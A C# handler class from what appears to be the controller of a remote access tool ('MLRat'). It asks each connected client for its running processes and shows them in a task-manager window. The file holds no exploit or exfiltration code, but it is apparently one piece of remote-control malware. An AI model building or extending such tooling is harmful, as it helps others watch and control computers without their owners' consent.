﻿using MLManagementServer.Forms;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLManagementServer.Handlers
{
    public static class TaskManagerHandler
    {
        static Dictionary<Guid, TaskManagerForm> formHandler = new Dictionary<Guid, TaskManagerForm>();
        static IServerUIHandler UIHost = null;

        public static void SetUIHost(IServerUIHandler _host)
        {
            UIHost = _host;
        }
        public static void Handle(IClient c, object[] data)
        {
            TaskManagerCommand command = (TaskManagerCommand)data[1];
            if (formHandler.ContainsKey(c.ID))
            {
                if (command == TaskManagerCommand.ProcessList)
                {
                    Console.WriteLine("TM Command; {0}", command.ToString());
                    TaskManagerForm f = formHandler[c.ID];
                    f.StartUpdate();

                    string[] procNames = (string[])data[2];
                    int[] procIds = (int[])data[3];
                    string[] procWindows = (string[])data[4];
                    bool[] hasWindow = (bool[])data[5];

                    int thisProc = (int)data[6];
                    for(int i = 0; i < procNames.Length; i++)
                    {
                        f.AddProcess(procNames[i], procIds[i], procWindows[i], hasWindow[i], procIds[i] == thisProc);
                    }
                }
            }
        }

        public static void Disconnect(IClient c)
        {
            if(formHandler.ContainsKey(c.ID))
            {
                formHandler[c.ID].Close();
            }
        }

        public static void ContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                Start(c);
        }

        public static void Start(IClient c)
        {
            if(!formHandler.ContainsKey(c.ID))
            {
                TaskManagerForm f = new TaskManagerForm(c, UIHost);
                f.FormClosed += F_FormClosed;
                formHandler.Add(c.ID, f);
                f.Show();
                c.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.GetProcesses);
            }
        }

        private static void F_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            TaskManagerForm f = (TaskManagerForm)sender;
            if(formHandler.ContainsKey(f.Client.ID))
            {
                formHandler.Remove(f.Client.ID);
            }
            f.Dispose();
        }
    }
}
